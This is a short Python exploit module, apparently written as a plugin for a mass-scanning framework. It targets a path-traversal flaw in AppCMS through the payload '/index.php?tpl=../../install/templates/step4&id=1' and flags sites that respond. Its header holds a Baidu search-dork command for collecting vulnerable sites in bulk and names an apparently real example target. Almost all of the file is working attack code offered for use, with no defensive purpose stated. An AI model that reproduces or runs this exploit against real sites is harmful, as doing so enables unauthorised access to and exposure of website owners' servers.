# coding:utf-8

'python framework.py -k "inurl:index.php?tpl=list_app&cpy=game&p=1" -p 10 -e baidu -l appcms_read_20101 -o appcms.txt'
'eg:http://www.lianmengshouzhuan.com/index.php?tpl=../../install/templates/step4&id=1'

import requests
import re

class Exploit:

    payload = "/index.php?tpl=../../install/templates/step4&id=1"
    comp = r'/templates/default/\.\./\.\./install/templates/step4\.php'

    def attack(self, url):
        response = requests.get(url+self.payload)
        if response.status_code == 200:
            if not re.search(self.comp, response.text) and 'host' in response.text:
                return url+self.payload